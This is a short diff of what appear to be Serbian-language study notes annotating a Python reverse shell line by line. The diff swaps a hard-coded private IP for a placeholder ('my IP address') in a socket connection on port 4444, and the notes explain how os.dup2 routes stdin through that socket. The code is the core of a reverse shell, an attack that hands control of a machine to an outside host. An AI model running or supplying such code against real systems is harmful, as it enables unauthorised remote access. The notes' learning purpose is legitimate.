@@ -16,7 +16,7 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 - AF_NET je IPv4
 - SOCK_STREAM je TCP
 
-s.connect(("192.168.187.249",4444))
+s.connect(("MOJA IP ADRESA",4444))
 - povezuje se na moju ip adresu i port
 
 os.dup2(s.fileno(),0) - stdin, sta kucam ide kroz socket
